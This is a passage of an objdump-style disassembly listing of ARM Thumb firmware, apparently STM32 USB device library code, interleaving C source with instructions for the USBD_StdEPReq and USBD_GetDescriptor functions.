 800bb0c:	b2db      	uxtb	r3, r3
 800bb0e:	2b02      	cmp	r3, #2
 800bb10:	d002      	beq.n	800bb18 <USBD_StdEPReq+0x124>
 800bb12:	2b03      	cmp	r3, #3
 800bb14:	d016      	beq.n	800bb44 <USBD_StdEPReq+0x150>
 800bb16:	e04b      	b.n	800bbb0 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800bb18:	7bbb      	ldrb	r3, [r7, #14]
 800bb1a:	2b00      	cmp	r3, #0
 800bb1c:	d00d      	beq.n	800bb3a <USBD_StdEPReq+0x146>
 800bb1e:	7bbb      	ldrb	r3, [r7, #14]
 800bb20:	2b80      	cmp	r3, #128	; 0x80
 800bb22:	d00a      	beq.n	800bb3a <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800bb24:	7bbb      	ldrb	r3, [r7, #14]
 800bb26:	4619      	mov	r1, r3
 800bb28:	6878      	ldr	r0, [r7, #4]
 800bb2a:	f001 f9e5 	bl	800cef8 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800bb2e:	2180      	movs	r1, #128	; 0x80
 800bb30:	6878      	ldr	r0, [r7, #4]
 800bb32:	f001 f9e1 	bl	800cef8 <USBD_LL_StallEP>
 800bb36:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800bb38:	e040      	b.n	800bbbc <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800bb3a:	6839      	ldr	r1, [r7, #0]
 800bb3c:	6878      	ldr	r0, [r7, #4]
 800bb3e:	f000 fc68 	bl	800c412 <USBD_CtlError>
              break;
 800bb42:	e03b      	b.n	800bbbc <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800bb44:	683b      	ldr	r3, [r7, #0]
 800bb46:	885b      	ldrh	r3, [r3, #2]
 800bb48:	2b00      	cmp	r3, #0
 800bb4a:	d136      	bne.n	800bbba <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800bb4c:	7bbb      	ldrb	r3, [r7, #14]
 800bb4e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bb52:	2b00      	cmp	r3, #0
 800bb54:	d004      	beq.n	800bb60 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800bb56:	7bbb      	ldrb	r3, [r7, #14]
 800bb58:	4619      	mov	r1, r3
 800bb5a:	6878      	ldr	r0, [r7, #4]
 800bb5c:	f001 fa02 	bl	800cf64 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800bb60:	6878      	ldr	r0, [r7, #4]
 800bb62:	f000 fd21 	bl	800c5a8 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800bb66:	7bbb      	ldrb	r3, [r7, #14]
 800bb68:	4619      	mov	r1, r3
 800bb6a:	6878      	ldr	r0, [r7, #4]
 800bb6c:	f7ff fde1 	bl	800b732 <USBD_CoreFindEP>
 800bb70:	4603      	mov	r3, r0
 800bb72:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800bb74:	7b7b      	ldrb	r3, [r7, #13]
 800bb76:	2bff      	cmp	r3, #255	; 0xff
 800bb78:	d01f      	beq.n	800bbba <USBD_StdEPReq+0x1c6>
 800bb7a:	7b7b      	ldrb	r3, [r7, #13]
 800bb7c:	2b00      	cmp	r3, #0
 800bb7e:	d11c      	bne.n	800bbba <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800bb80:	7b7a      	ldrb	r2, [r7, #13]
 800bb82:	687b      	ldr	r3, [r7, #4]
 800bb84:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800bb88:	7b7a      	ldrb	r2, [r7, #13]
 800bb8a:	687b      	ldr	r3, [r7, #4]
 800bb8c:	32ae      	adds	r2, #174	; 0xae
 800bb8e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800bb92:	689b      	ldr	r3, [r3, #8]
 800bb94:	2b00      	cmp	r3, #0
 800bb96:	d010      	beq.n	800bbba <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800bb98:	7b7a      	ldrb	r2, [r7, #13]
 800bb9a:	687b      	ldr	r3, [r7, #4]
 800bb9c:	32ae      	adds	r2, #174	; 0xae
 800bb9e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800bba2:	689b      	ldr	r3, [r3, #8]
 800bba4:	6839      	ldr	r1, [r7, #0]
 800bba6:	6878      	ldr	r0, [r7, #4]
 800bba8:	4798      	blx	r3
 800bbaa:	4603      	mov	r3, r0
 800bbac:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800bbae:	e004      	b.n	800bbba <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800bbb0:	6839      	ldr	r1, [r7, #0]
 800bbb2:	6878      	ldr	r0, [r7, #4]
 800bbb4:	f000 fc2d 	bl	800c412 <USBD_CtlError>
              break;
 800bbb8:	e000      	b.n	800bbbc <USBD_StdEPReq+0x1c8>
              break;
 800bbba:	bf00      	nop
          }
          break;
 800bbbc:	e0ab      	b.n	800bd16 <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800bbbe:	687b      	ldr	r3, [r7, #4]
 800bbc0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bbc4:	b2db      	uxtb	r3, r3
 800bbc6:	2b02      	cmp	r3, #2
 800bbc8:	d002      	beq.n	800bbd0 <USBD_StdEPReq+0x1dc>
 800bbca:	2b03      	cmp	r3, #3
 800bbcc:	d032      	beq.n	800bc34 <USBD_StdEPReq+0x240>
 800bbce:	e097      	b.n	800bd00 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800bbd0:	7bbb      	ldrb	r3, [r7, #14]
 800bbd2:	2b00      	cmp	r3, #0
 800bbd4:	d007      	beq.n	800bbe6 <USBD_StdEPReq+0x1f2>
 800bbd6:	7bbb      	ldrb	r3, [r7, #14]
 800bbd8:	2b80      	cmp	r3, #128	; 0x80
 800bbda:	d004      	beq.n	800bbe6 <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800bbdc:	6839      	ldr	r1, [r7, #0]
 800bbde:	6878      	ldr	r0, [r7, #4]
 800bbe0:	f000 fc17 	bl	800c412 <USBD_CtlError>
                break;
 800bbe4:	e091      	b.n	800bd0a <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bbe6:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bbea:	2b00      	cmp	r3, #0
 800bbec:	da0b      	bge.n	800bc06 <USBD_StdEPReq+0x212>
 800bbee:	7bbb      	ldrb	r3, [r7, #14]
 800bbf0:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800bbf4:	4613      	mov	r3, r2
 800bbf6:	009b      	lsls	r3, r3, #2
 800bbf8:	4413      	add	r3, r2
 800bbfa:	009b      	lsls	r3, r3, #2
 800bbfc:	3310      	adds	r3, #16
 800bbfe:	687a      	ldr	r2, [r7, #4]
 800bc00:	4413      	add	r3, r2
 800bc02:	3304      	adds	r3, #4
 800bc04:	e00b      	b.n	800bc1e <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800bc06:	7bbb      	ldrb	r3, [r7, #14]
 800bc08:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bc0c:	4613      	mov	r3, r2
 800bc0e:	009b      	lsls	r3, r3, #2
 800bc10:	4413      	add	r3, r2
 800bc12:	009b      	lsls	r3, r3, #2
 800bc14:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800bc18:	687a      	ldr	r2, [r7, #4]
 800bc1a:	4413      	add	r3, r2
 800bc1c:	3304      	adds	r3, #4
 800bc1e:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800bc20:	68bb      	ldr	r3, [r7, #8]
 800bc22:	2200      	movs	r2, #0
 800bc24:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bc26:	68bb      	ldr	r3, [r7, #8]
 800bc28:	2202      	movs	r2, #2
 800bc2a:	4619      	mov	r1, r3
 800bc2c:	6878      	ldr	r0, [r7, #4]
 800bc2e:	f000 fc61 	bl	800c4f4 <USBD_CtlSendData>
              break;
 800bc32:	e06a      	b.n	800bd0a <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800bc34:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bc38:	2b00      	cmp	r3, #0
 800bc3a:	da11      	bge.n	800bc60 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800bc3c:	7bbb      	ldrb	r3, [r7, #14]
 800bc3e:	f003 020f 	and.w	r2, r3, #15
 800bc42:	6879      	ldr	r1, [r7, #4]
 800bc44:	4613      	mov	r3, r2
 800bc46:	009b      	lsls	r3, r3, #2
 800bc48:	4413      	add	r3, r2
 800bc4a:	009b      	lsls	r3, r3, #2
 800bc4c:	440b      	add	r3, r1
 800bc4e:	3324      	adds	r3, #36	; 0x24
 800bc50:	881b      	ldrh	r3, [r3, #0]
 800bc52:	2b00      	cmp	r3, #0
 800bc54:	d117      	bne.n	800bc86 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800bc56:	6839      	ldr	r1, [r7, #0]
 800bc58:	6878      	ldr	r0, [r7, #4]
 800bc5a:	f000 fbda 	bl	800c412 <USBD_CtlError>
                  break;
 800bc5e:	e054      	b.n	800bd0a <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800bc60:	7bbb      	ldrb	r3, [r7, #14]
 800bc62:	f003 020f 	and.w	r2, r3, #15
 800bc66:	6879      	ldr	r1, [r7, #4]
 800bc68:	4613      	mov	r3, r2
 800bc6a:	009b      	lsls	r3, r3, #2
 800bc6c:	4413      	add	r3, r2
 800bc6e:	009b      	lsls	r3, r3, #2
 800bc70:	440b      	add	r3, r1
 800bc72:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800bc76:	881b      	ldrh	r3, [r3, #0]
 800bc78:	2b00      	cmp	r3, #0
 800bc7a:	d104      	bne.n	800bc86 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800bc7c:	6839      	ldr	r1, [r7, #0]
 800bc7e:	6878      	ldr	r0, [r7, #4]
 800bc80:	f000 fbc7 	bl	800c412 <USBD_CtlError>
                  break;
 800bc84:	e041      	b.n	800bd0a <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bc86:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bc8a:	2b00      	cmp	r3, #0
 800bc8c:	da0b      	bge.n	800bca6 <USBD_StdEPReq+0x2b2>
 800bc8e:	7bbb      	ldrb	r3, [r7, #14]
 800bc90:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800bc94:	4613      	mov	r3, r2
 800bc96:	009b      	lsls	r3, r3, #2
 800bc98:	4413      	add	r3, r2
 800bc9a:	009b      	lsls	r3, r3, #2
 800bc9c:	3310      	adds	r3, #16
 800bc9e:	687a      	ldr	r2, [r7, #4]
 800bca0:	4413      	add	r3, r2
 800bca2:	3304      	adds	r3, #4
 800bca4:	e00b      	b.n	800bcbe <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800bca6:	7bbb      	ldrb	r3, [r7, #14]
 800bca8:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bcac:	4613      	mov	r3, r2
 800bcae:	009b      	lsls	r3, r3, #2
 800bcb0:	4413      	add	r3, r2
 800bcb2:	009b      	lsls	r3, r3, #2
 800bcb4:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800bcb8:	687a      	ldr	r2, [r7, #4]
 800bcba:	4413      	add	r3, r2
 800bcbc:	3304      	adds	r3, #4
 800bcbe:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800bcc0:	7bbb      	ldrb	r3, [r7, #14]
 800bcc2:	2b00      	cmp	r3, #0
 800bcc4:	d002      	beq.n	800bccc <USBD_StdEPReq+0x2d8>
 800bcc6:	7bbb      	ldrb	r3, [r7, #14]
 800bcc8:	2b80      	cmp	r3, #128	; 0x80
 800bcca:	d103      	bne.n	800bcd4 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800bccc:	68bb      	ldr	r3, [r7, #8]
 800bcce:	2200      	movs	r2, #0
 800bcd0:	601a      	str	r2, [r3, #0]
 800bcd2:	e00e      	b.n	800bcf2 <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800bcd4:	7bbb      	ldrb	r3, [r7, #14]
 800bcd6:	4619      	mov	r1, r3
 800bcd8:	6878      	ldr	r0, [r7, #4]
 800bcda:	f001 f979 	bl	800cfd0 <USBD_LL_IsStallEP>
 800bcde:	4603      	mov	r3, r0
 800bce0:	2b00      	cmp	r3, #0
 800bce2:	d003      	beq.n	800bcec <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800bce4:	68bb      	ldr	r3, [r7, #8]
 800bce6:	2201      	movs	r2, #1
 800bce8:	601a      	str	r2, [r3, #0]
 800bcea:	e002      	b.n	800bcf2 <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800bcec:	68bb      	ldr	r3, [r7, #8]
 800bcee:	2200      	movs	r2, #0
 800bcf0:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bcf2:	68bb      	ldr	r3, [r7, #8]
 800bcf4:	2202      	movs	r2, #2
 800bcf6:	4619      	mov	r1, r3
 800bcf8:	6878      	ldr	r0, [r7, #4]
 800bcfa:	f000 fbfb 	bl	800c4f4 <USBD_CtlSendData>
              break;
 800bcfe:	e004      	b.n	800bd0a <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800bd00:	6839      	ldr	r1, [r7, #0]
 800bd02:	6878      	ldr	r0, [r7, #4]
 800bd04:	f000 fb85 	bl	800c412 <USBD_CtlError>
              break;
 800bd08:	bf00      	nop
          }
          break;
 800bd0a:	e004      	b.n	800bd16 <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800bd0c:	6839      	ldr	r1, [r7, #0]
 800bd0e:	6878      	ldr	r0, [r7, #4]
 800bd10:	f000 fb7f 	bl	800c412 <USBD_CtlError>
          break;
 800bd14:	bf00      	nop
      }
      break;
 800bd16:	e005      	b.n	800bd24 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800bd18:	6839      	ldr	r1, [r7, #0]
 800bd1a:	6878      	ldr	r0, [r7, #4]
 800bd1c:	f000 fb79 	bl	800c412 <USBD_CtlError>
      break;
 800bd20:	e000      	b.n	800bd24 <USBD_StdEPReq+0x330>
      break;
 800bd22:	bf00      	nop
  }

  return ret;
 800bd24:	7bfb      	ldrb	r3, [r7, #15]
}
 800bd26:	4618      	mov	r0, r3
 800bd28:	3710      	adds	r7, #16
 800bd2a:	46bd      	mov	sp, r7
 800bd2c:	bd80      	pop	{r7, pc}
	...

0800bd30 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bd30:	b580      	push	{r7, lr}
 800bd32:	b084      	sub	sp, #16
 800bd34:	af00      	add	r7, sp, #0
 800bd36:	6078      	str	r0, [r7, #4]
 800bd38:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800bd3a:	2300      	movs	r3, #0
 800bd3c:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800bd3e:	2300      	movs	r3, #0
 800bd40:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800bd42:	2300      	movs	r3, #0
 800bd44:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800bd46:	683b      	ldr	r3, [r7, #0]
 800bd48:	885b      	ldrh	r3, [r3, #2]
 800bd4a:	0a1b      	lsrs	r3, r3, #8
 800bd4c:	b29b      	uxth	r3, r3
 800bd4e:	3b01      	subs	r3, #1
 800bd50:	2b0e      	cmp	r3, #14
 800bd52:	f200 8152 	bhi.w	800bffa <USBD_GetDescriptor+0x2ca>
 800bd56:	a201      	add	r2, pc, #4	; (adr r2, 800bd5c <USBD_GetDescriptor+0x2c>)
 800bd58:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bd5c:	0800bdcd 	.word	0x0800bdcd
 800bd60:	0800bde5 	.word	0x0800bde5
 800bd64:	0800be25 	.word	0x0800be25
 800bd68:	0800bffb 	.word	0x0800bffb
 800bd6c:	0800bffb 	.word	0x0800bffb
 800bd70:	0800bf9b 	.word	0x0800bf9b
 800bd74:	0800bfc7 	.word	0x0800bfc7
 800bd78:	0800bffb 	.word	0x0800bffb
 800bd7c:	0800bffb 	.word	0x0800bffb
 800bd80:	0800bffb 	.word	0x0800bffb
 800bd84:	0800bffb 	.word	0x0800bffb
 800bd88:	0800bffb 	.word	0x0800bffb
 800bd8c:	0800bffb 	.word	0x0800bffb
 800bd90:	0800bffb 	.word	0x0800bffb
 800bd94:	0800bd99 	.word	0x0800bd99
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bd98:	687b      	ldr	r3, [r7, #4]
 800bd9a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd9e:	69db      	ldr	r3, [r3, #28]
 800bda0:	2b00      	cmp	r3, #0
 800bda2:	d00b      	beq.n	800bdbc <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bda4:	687b      	ldr	r3, [r7, #4]
 800bda6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdaa:	69db      	ldr	r3, [r3, #28]
 800bdac:	687a      	ldr	r2, [r7, #4]
 800bdae:	7c12      	ldrb	r2, [r2, #16]
 800bdb0:	f107 0108 	add.w	r1, r7, #8
 800bdb4:	4610      	mov	r0, r2
 800bdb6:	4798      	blx	r3
 800bdb8:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bdba:	e126      	b.n	800c00a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bdbc:	6839      	ldr	r1, [r7, #0]
 800bdbe:	6878      	ldr	r0, [r7, #4]
 800bdc0:	f000 fb27 	bl	800c412 <USBD_CtlError>
        err++;
 800bdc4:	7afb      	ldrb	r3, [r7, #11]
 800bdc6:	3301      	adds	r3, #1
 800bdc8:	72fb      	strb	r3, [r7, #11]
      break;
 800bdca:	e11e      	b.n	800c00a <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bdcc:	687b      	ldr	r3, [r7, #4]
 800bdce:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdd2:	681b      	ldr	r3, [r3, #0]
 800bdd4:	687a      	ldr	r2, [r7, #4]
 800bdd6:	7c12      	ldrb	r2, [r2, #16]
 800bdd8:	f107 0108 	add.w	r1, r7, #8
 800bddc:	4610      	mov	r0, r2
 800bdde:	4798      	blx	r3
 800bde0:	60f8      	str	r0, [r7, #12]
      break;
 800bde2:	e112      	b.n	800c00a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bde4:	687b      	ldr	r3, [r7, #4]
 800bde6:	7c1b      	ldrb	r3, [r3, #16]
 800bde8:	2b00      	cmp	r3, #0
 800bdea:	d10d      	bne.n	800be08 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bdec:	687b      	ldr	r3, [r7, #4]
 800bdee:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bdf2:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bdf4:	f107 0208 	add.w	r2, r7, #8
 800bdf8:	4610      	mov	r0, r2
 800bdfa:	4798      	blx	r3
 800bdfc:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bdfe:	68fb      	ldr	r3, [r7, #12]
 800be00:	3301      	adds	r3, #1
 800be02:	2202      	movs	r2, #2
 800be04:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800be06:	e100      	b.n	800c00a <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800be08:	687b      	ldr	r3, [r7, #4]
 800be0a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800be0e:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800be10:	f107 0208 	add.w	r2, r7, #8
 800be14:	4610      	mov	r0, r2
 800be16:	4798      	blx	r3
 800be18:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800be1a:	68fb      	ldr	r3, [r7, #12]
 800be1c:	3301      	adds	r3, #1
 800be1e:	2202      	movs	r2, #2
 800be20:	701a      	strb	r2, [r3, #0]
      break;
 800be22:	e0f2      	b.n	800c00a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800be24:	683b      	ldr	r3, [r7, #0]
 800be26:	885b      	ldrh	r3, [r3, #2]
 800be28:	b2db      	uxtb	r3, r3
 800be2a:	2b05      	cmp	r3, #5
 800be2c:	f200 80ac 	bhi.w	800bf88 <USBD_GetDescriptor+0x258>
 800be30:	a201      	add	r2, pc, #4	; (adr r2, 800be38 <USBD_GetDescriptor+0x108>)
 800be32:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800be36:	bf00      	nop
 800be38:	0800be51 	.word	0x0800be51
 800be3c:	0800be85 	.word	0x0800be85
 800be40:	0800beb9 	.word	0x0800beb9
 800be44:	0800beed 	.word	0x0800beed
 800be48:	0800bf21 	.word	0x0800bf21
 800be4c:	0800bf55 	.word	0x0800bf55
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800be50:	687b      	ldr	r3, [r7, #4]
 800be52:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be56:	685b      	ldr	r3, [r3, #4]
 800be58:	2b00      	cmp	r3, #0
 800be5a:	d00b      	beq.n	800be74 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800be5c:	687b      	ldr	r3, [r7, #4]
 800be5e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be62:	685b      	ldr	r3, [r3, #4]
 800be64:	687a      	ldr	r2, [r7, #4]
 800be66:	7c12      	ldrb	r2, [r2, #16]
 800be68:	f107 0108 	add.w	r1, r7, #8
 800be6c:	4610      	mov	r0, r2
 800be6e:	4798      	blx	r3
 800be70:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be72:	e091      	b.n	800bf98 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be74:	6839      	ldr	r1, [r7, #0]
 800be76:	6878      	ldr	r0, [r7, #4]
 800be78:	f000 facb 	bl	800c412 <USBD_CtlError>
            err++;
 800be7c:	7afb      	ldrb	r3, [r7, #11]
 800be7e:	3301      	adds	r3, #1
 800be80:	72fb      	strb	r3, [r7, #11]
          break;
 800be82:	e089      	b.n	800bf98 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800be84:	687b      	ldr	r3, [r7, #4]
 800be86:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be8a:	689b      	ldr	r3, [r3, #8]
 800be8c:	2b00      	cmp	r3, #0
 800be8e:	d00b      	beq.n	800bea8 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800be90:	687b      	ldr	r3, [r7, #4]
 800be92:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be96:	689b      	ldr	r3, [r3, #8]
 800be98:	687a      	ldr	r2, [r7, #4]
 800be9a:	7c12      	ldrb	r2, [r2, #16]
 800be9c:	f107 0108 	add.w	r1, r7, #8
 800bea0:	4610      	mov	r0, r2
 800bea2:	4798      	blx	r3
 800bea4:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bea6:	e077      	b.n	800bf98 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bea8:	6839      	ldr	r1, [r7, #0]
 800beaa:	6878      	ldr	r0, [r7, #4]
 800beac:	f000 fab1 	bl	800c412 <USBD_CtlError>
            err++;
 800beb0:	7afb      	ldrb	r3, [r7, #11]
 800beb2:	3301      	adds	r3, #1
 800beb4:	72fb      	strb	r3, [r7, #11]
          break;
 800beb6:	e06f      	b.n	800bf98 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800beb8:	687b      	ldr	r3, [r7, #4]
 800beba:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bebe:	68db      	ldr	r3, [r3, #12]
 800bec0:	2b00      	cmp	r3, #0
 800bec2:	d00b      	beq.n	800bedc <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bec4:	687b      	ldr	r3, [r7, #4]
 800bec6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800beca:	68db      	ldr	r3, [r3, #12]
 800becc:	687a      	ldr	r2, [r7, #4]
 800bece:	7c12      	ldrb	r2, [r2, #16]
 800bed0:	f107 0108 	add.w	r1, r7, #8
 800bed4:	4610      	mov	r0, r2
 800bed6:	4798      	blx	r3
 800bed8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800beda:	e05d      	b.n	800bf98 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bedc:	6839      	ldr	r1, [r7, #0]
 800bede:	6878      	ldr	r0, [r7, #4]
 800bee0:	f000 fa97 	bl	800c412 <USBD_CtlError>
            err++;
 800bee4:	7afb      	ldrb	r3, [r7, #11]
 800bee6:	3301      	adds	r3, #1
 800bee8:	72fb      	strb	r3, [r7, #11]
          break;
 800beea:	e055      	b.n	800bf98 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800beec:	687b      	ldr	r3, [r7, #4]
 800beee:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bef2:	691b      	ldr	r3, [r3, #16]
 800bef4:	2b00      	cmp	r3, #0
 800bef6:	d00b      	beq.n	800bf10 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800bef8:	687b      	ldr	r3, [r7, #4]
 800befa:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800befe:	691b      	ldr	r3, [r3, #16]
 800bf00:	687a      	ldr	r2, [r7, #4]
 800bf02:	7c12      	ldrb	r2, [r2, #16]
 800bf04:	f107 0108 	add.w	r1, r7, #8
 800bf08:	4610      	mov	r0, r2
 800bf0a:	4798      	blx	r3
 800bf0c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bf0e:	e043      	b.n	800bf98 <USBD_GetDescriptor+0x268>
